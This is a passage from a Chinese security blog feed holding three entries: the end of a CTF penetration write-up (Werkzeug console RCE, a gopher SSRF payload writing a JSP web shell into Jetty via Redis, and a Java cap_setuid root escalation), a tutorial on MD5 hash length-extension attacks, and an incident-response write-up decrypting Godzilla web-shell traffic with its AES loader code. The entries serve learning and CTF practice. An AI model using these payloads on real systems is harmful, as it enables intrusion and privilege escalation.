src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124162717034.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wzdc58fd521ffb0cae532091737707116|910ebc3905cd</span><br></pre></td></tr></table></figure><p>然后进行rce：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -b &quot;__wzdc58fd521ffb0cae53209=1737707116|910ebc3905cd&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=__import__(&#x27;os&#x27;).system(&#x27;&#x27;&#x27;cat%20\/etc\/passwd&gt;.\/log\/jwk.log&#x27;&#x27;&#x27;)&amp;frm=0&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124163537697.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124163641184.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfer:x:1000:1000::/home/ctfer:/bin/bash</span><br></pre></td></tr></table></figure><h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250102184258603.png" class="" title="This is an example image"><p>扫到一个java服务。jetty，没什么其他的，看看是否存在版本漏洞。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250102185318086.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250102185324743.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow_2025</span><br></pre></td></tr></table></figure><p>CVE-2021-28164</p><p><strong>提交 &#x2F;dylan.txt 中的key</strong></p><p>既然我们获得了redis的密码，那么我们接下来登录redis</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://172.2.229.7:6380/auth:ctfshow_2025</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124164152106.png" class="" title="This is an example image"><p><img src="https://img2024.cnblogs.com/blog/3392505/202501/3392505-20250108131824159-136678188.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auth ctfshow_2025</span><br><span class="line">config set dir /opt/jetty/webapps/ROOT/</span><br><span class="line">config set dbfilename hack.jsp</span><br><span class="line">set xxx &quot;&lt;% Runtime.getRuntime().exec(new String[]&#123;\&quot;sh\&quot;,\&quot;-c\&quot;,request.getParameter(\&quot;cmd\&quot;)&#125;);%&gt;&quot;</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;gopher://172.2.95.7:6380/_auth%20ctfshow_2025%0aconfig%20set%20dir%20%2fopt%2fjetty%2fwebapps%2fROOT%2f%0aconfig%20set%20dbfilename%20hack.jsp%0aset%20xxx%20%22%3c%25%20Runtime.getRuntime().exec(new%20String%5b%5d%7b%5c%22sh%5c%22%2c%5c%22-c%5c%22%2crequest.getParameter(%5c%22cmd%5c%22)%7d)%3b%25%3e%22%0asave%0aquit&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124165521240.png" class="" title="This is an example image"><p>不出意外写马是成功的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.95.7:8080/hack.jsp?cmd=cat%20/dylan.txt&gt;/opt/jetty/webapps/ROOT/1.txt</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124165632050.png" class="" title="This is an example image"><p>然后去访问1.txt即可。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124165700581.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7b11a7ae330883cb5bf667a9c1604635</span><br></pre></td></tr></table></figure><p><strong>提交&#x2F;root&#x2F;message.txt中提到的网址</strong></p><p>一眼需要提权！</p><p>列出文件能力：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.95.7:8080/hack.jsp?cmd=getcap%20-r%20/%202&gt;/dev/null&gt; /opt/jetty/webapps/ROOT/cap.txt</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124170452149.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/openjdk-8/bin/java = cap_setuid+ep</span><br></pre></td></tr></table></figure><p>好东西，java有setuid能力</p><p>写入 SetUID.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">Java_SetUID_setUID</span><span class="params">(JNIEnv *env, jobject obj, jint uid)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> setuid(uid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=echo%20&quot;I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9&quot;%20|base64%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;jni.h&gt;</span><br><span class="line">//1111111111122</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL Java_SetUID_setUID(JNIEnv *env, jobject obj, jint uid) &#123;</span><br><span class="line">    return setuid(uid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#不知道为啥这里要注释一行才行，，，</span><br></pre></td></tr></table></figure><p>写入SetUID.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SetUID</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;SetUID&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">setUID</span><span class="params">(<span class="type">int</span> uid)</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SetUID</span> <span class="variable">setUID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SetUID</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> setUID.setUID(<span class="number">0</span>); </span><br><span class="line">        Runtime.getRuntime.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /root/*.txt&gt;/opt/jetty/webapps/ROOT/root.txt&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=echo%20&quot;cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvcm9vdC8qLnR4dD4vb3B0L2pldHR5L3dlYmFwcHMvUk9PVC9yb290LnR4dCJ9KTsKICAgIH0KfQ==&quot;%20|base64%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.java</span><br></pre></td></tr></table></figure><p>编译SetUID.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=gcc%20-shared%20-fPIC%20-o%20/opt/jetty/webapps/ROOT/libSetUID.so%20-I$&#123;JAVA_HOME&#125;/include%20-I$&#123;JAVA_HOME&#125;/include/linux%20/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure><p>编译SetUID.java</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=javac%<span class="number">20</span>/opt/jetty/webapps/ROOT/SetUID.java</span><br></pre></td></tr></table></figure><p>root执行命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=java%<span class="number">20</span>-Djava.library.path=/opt/jetty/webapps/ROOT/%<span class="number">20</span>-cp%<span class="number">20</span>/opt/jetty/webapps/ROOT/%20SetUID</span><br></pre></td></tr></table></figure><p>成功读取root下面的txt文件</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124172301657.png" class="" title="This is an example image">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hash长度拓展攻击</title>
      <link href="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="Hash长度拓展攻击"><a href="#Hash长度拓展攻击" class="headerlink" title="Hash长度拓展攻击"></a>Hash长度拓展攻击</h1><blockquote><p>参考：</p><p><a href="https://www.0x002.com/2020/%E6%B5%85%E8%B0%88HASH%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/">https://www.0x002.com/2020/%E6%B5%85%E8%B0%88HASH%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</a></p><p><a href="https://xz.aliyun.com/t/10602?time__1311=CqjxRGiteiq05DK5YIx7Ki=oQet6QHW4D#toc-1">https://xz.aliyun.com/t/10602?time__1311=CqjxRGiteiq05DK5YIx7Ki%3DoQet6QHW4D#toc-1</a></p><p><a href="https://ciphersaw.me/2017/11/12/hash-length-extension-attack/#0x00-%E5%89%8D%E8%A8%80">https://ciphersaw.me/2017/11/12/hash-length-extension-attack/#0x00-%E5%89%8D%E8%A8%80</a></p></blockquote><p>hash长度拓展攻击，概括一下就是由于hash的生成机制使得我们可以人为的在原先的明文基础上添加新的拓展字符，从而使得原本的加密链变长，进一步控制加密链的最后一节，使得我们得以控制最终的结果。</p><p>这里首先给出一个相关demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$secretKey</span> = <span class="string">&#x27;xxxxxx&#x27;</span>; <span class="comment">#xxx为未知内容，但长度已知为6。</span></span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$sign</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line"><span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$secretKey</span>.<span class="variable">$v1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v1</span> === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$token</span>); <span class="comment">#token=2df51a84abc64a28740d6d2ae8cd7b16</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span> === <span class="variable">$sign</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在这个例子中，我们需要使得变量<code>$token</code>与我们输入的sign参数满足一致才会输出flag。</p><p>而由于我们无法知道变量<code>$secretKey</code>的内容，所以无法得到<code>$token</code>的值，故而看似是没有办法获取到flag的死局，而这时便轮到我们的拓展攻击来大显身手了。</p><h2 id="md5算法过程"><a href="#md5算法过程" class="headerlink" title="md5算法过程"></a>md5算法过程</h2><img src="https://img.0x002.com/article/hashLengthExtensionHack/20180813125243-b731fe76-9eb4-1.png" alt="MD5加密流程" style="zoom:80%;" /><p>md5算法是512位一组的，也就是64字节一组，见下面的例子：</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092231452.png" class="" title="图片引用方法一"><p>由64个a和3个b组成，这里的64个a其二进制长度为512位，已经符合一个md5分组，后面的bbb是下一个分组了。</p><blockquote><p>对于md5算法，我们需要将原始数据分块处理，以512个二进制数据为一块。”最后“一块的处理分为以下两种情况：</p><ul><li>明文数据的二进制数据长度&lt;&#x3D;448，填充padding(无意义占位)数据使其长度为448，再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。</li><li>448&lt;明文数据的二进制数据长度&lt;&#x3D;512，填充padding数据至下一块的448位，而后再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。</li></ul></blockquote><p><strong>情况一：</strong></p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092526249.png" class="" title="图片引用方法一"><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092538591.png" class="" title="图片引用方法一"><p>这里其实64个字符a组成了一个md5分组，剩下的32个字符b作为下一个md5分组，然后需要进行填充。</p><p>进行填充的方式就是在二进制下第一个补1，后面的依次补0 。但是在这里咱们是以十六进制形式在010里演示的，而对于十六进制来说，一个十六进制字符对应4个二进制字符，所以对于010里面数据来说，10000000(2)&#x3D;&#x3D;80(16)，补充上去就是：</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092858007.png" class="" title="图片引用方法一"><p>然后后面依次补0，知道填满448位为止，得到最终补位结果为：</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104093536746.png" class="" title="图片引用方法一"><p>然后还需要补位8个字节，原始明文为64个a和32个b，共96个字符，768位，转换为十六进制就是300。</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104094147690.png" class="" title="图片引用方法一"><p><strong>情况二：</strong></p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104094227950.png" class="" title="图片引用方法一"><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104094235021.png" class="" title="图片引用方法一"><p>补位就不展示了，跟上面的情况一是同理的。</p><p>对于MD5算法来说，有一串初始向量如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x67452301</span><br><span class="line">B=0xefcdab89</span><br><span class="line">C=0x98badcfe</span><br><span class="line">D=0x10325476</span><br></pre></td></tr></table></figure><p>这串初始向量的值是固定的，作为与第一块数据运算的原始向量。</p><p>当这串向量与第一块数据块运算之后，得到了一串新的向量值，这串新的向量值接着与第二块数据块参加运算，直到最后一块数据块。</p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200906234219.png" alt="向量运算" style="zoom:67%;" /><p>而最后的MD5值就是这最后的向量串经过如下转换的结果。</p><p>如向量串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0xab45bc01</span><br><span class="line">B=0x6a64bb53</span><br><span class="line">C=0x23ba8afe</span><br><span class="line">D=0x46847a62</span><br></pre></td></tr></table></figure><p>再进行高低位互换，得到如下数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">01 bc 45 ab</span><br><span class="line">53 bb 64 6a</span><br><span class="line">fe 8a ba 23</span><br><span class="line">62 7a 84 46</span><br></pre></td></tr></table></figure><p>最终拼接得到MD5值：<code>01bc45ab53bb646afe8aba23627a8446</code>。</p><h3 id="回首demo"><a href="#回首demo" class="headerlink" title="回首demo"></a>回首demo</h3><p>然后回到先前那个例子：</p><p>对于MD5值：<code>2df51a84abc64a28740d6d2ae8cd7b16</code>。我们可以根据MD5与向量互转规则，将MD5转成<code>md5($secretKey + &quot;test&quot;)</code>的最终向量值（A’、B’、C’、D’）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A&#x27;=0x841af52d</span><br><span class="line">B&#x27;=0x284ac6ab</span><br><span class="line">C&#x27;=0x2a6d0d74</span><br><span class="line">D&#x27;=0x167bcde8</span><br></pre></td></tr></table></figure><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200907000504.png" alt="例子向量运算过程" style="zoom:80%;" /><p>这时候我们修改<code>$v1</code>变量的内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;test&quot; + [0x80 + (0x0)*45] + [0x50 + 0x0*7] + &quot;abc&quot;</span><br><span class="line">相当于:</span><br><span class="line">&quot;test&quot; + padding数据 + 长度数据 + &quot;abc&quot;</span><br></pre></td></tr></table></figure><p>则上述过程则被延续成下图所示：</p><p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200907002411.png" alt="延续运算过程"></p><p>而对于上述运算过程来说，我们知道了倒数第二个向量串的内容和最后一个数据块，这样一来，最终的MD5值我们也可以自己通过MD5算法计算出来了。</p><h2 id="利用工具exploit"><a href="#利用工具exploit" class="headerlink" title="利用工具exploit"></a>利用工具exploit</h2><h3 id="hash-ext-attack-master"><a href="#hash-ext-attack-master" class="headerlink" title="hash-ext-attack-master"></a>hash-ext-attack-master</h3><h3 id="hashpump"><a href="#hashpump" class="headerlink" title="hashpump"></a>hashpump</h3><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104095951008.png" class="" title="图片引用方法一"><h3 id="hash-extender"><a href="#hash-extender" class="headerlink" title="hash_extender"></a>hash_extender</h3><p><a href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第一届solar应急响应-wp</title>
      <link href="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/"/>
      <url>/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="第一届solar应急响应比赛-复现"><a href="#第一届solar应急响应比赛-复现" class="headerlink" title="第一届solar应急响应比赛 复现"></a>第一届solar应急响应比赛 复现</h1><h2 id="日志流量"><a href="#日志流量" class="headerlink" title="日志流量"></a>日志流量</h2><h3 id="日志流量1"><a href="#日志流量1" class="headerlink" title="日志流量1"></a>日志流量1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目文件：tomcat-wireshark.zip/web</span><br><span class="line">新手运维小王的Geoserver遭到了攻击：</span><br><span class="line">黑客疑似删除了webshell后门，小王找到了可能是攻击痕迹的文件但不一定是正确的，请帮他排查一下。</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>web目录，存在后门？那就用d盾扫</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229094659560.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229094743847.png" class="" title="图片引用方法一"><p>code是base64编码，怀疑是flag，解码看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f!l^a*g&#123;A7b4_X9zK_2v8N_wL5q4&#125;</span><br></pre></td></tr></table></figure><h3 id="日志流量2"><a href="#日志流量2" class="headerlink" title="日志流量2"></a>日志流量2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目文件：tomcat-wireshark.zip/web</span><br><span class="line">新手运维小王的Geoserver遭到了攻击：</span><br><span class="line">小王拿到了当时被入侵时的流量，其中一个IP有访问webshell的流量，已提取部分放在了两个pcapng中了。请帮他解密该流量。</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>题目1是后门嘛，那么密码，加密方式等肯定在里面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String code=<span class="string">&quot;ZiFsXmEqZ3tBN2I0X1g5ektfMnY4Tl93TDVxNH0=&quot;</span>; String xc=<span class="string">&quot;a2550eeab0724a69&quot;</span>; <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;<span class="keyword">public</span> <span class="title function_">X</span><span class="params">(ClassLoader z)</span>&#123;<span class="built_in">super</span>(z);&#125;<span class="keyword">public</span> Class <span class="title function_">Q</span><span class="params">(<span class="type">byte</span>[] cb)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);&#125; &#125;<span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s,<span class="type">boolean</span> m)&#123; <span class="keyword">try</span>&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(m?<span class="number">1</span>:<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="keyword">return</span> c.doFinal(s); &#125;<span class="keyword">catch</span> (Exception e)&#123;<span class="keyword">return</span> <span class="literal">null</span>; &#125;&#125;</span><br></pre></td></tr></table></figure><p>AES加密，密钥也给了a2550eeab0724a69</p><p>这里先看流量包。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229095121947.png" class="" title="图片引用方法一"><p>不出意外这就是我们需要查看的流量了。b.jsp</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229095203297.png" class="" title="图片引用方法一"><p><strong>这里说一下如何判断哥斯拉流量特征：</strong></p><p><a href="https://feifeitan.cn/index.php/archives/280/">https://feifeitan.cn/index.php/archives/280/</a></p><p><a href="https://blog.csdn.net/sinat_31884905/article/details/132548617">https://blog.csdn.net/sinat_31884905/article/details/132548617</a></p><p>具体可以看我的笔记。</p><p>这里根据Cookie值最后出现了分号可以判断它是哥斯拉流量！！</p><p>然后我们需要做的就是解密哥斯拉流量。</p><p>发现这个流量的格式是raw的，很混淆，不是标准的base64，那么我们转换到原始数据，直接用cyberchef解密即可。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102503964.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102526760.png" class="" title="图片引用方法一"><p>密钥也有了，设置一下然后再接一个Gunzip即可。</p><p>这要翻好久，终于翻到了一个flag.txt，readfile，那么flag可能就在请求包中！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102614706.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102812837.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sA4hP_89dFh_x09tY_lL4SI4&#125;</span><br></pre></td></tr></table></figure><h3 id="日志流量3"><a href="#日志流量3" class="headerlink" title="日志流量3"></a>日志流量3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目文件：tomcat-wireshark.zip/web</span><br><span class="line">新手运维小王的Geoserver遭到了攻击：</span><br><span class="line">小王拿到了当时被入侵时的流量，黑客疑似通过webshell上传了文件，请看看里面是什么。</span><br><span class="line">flag格式 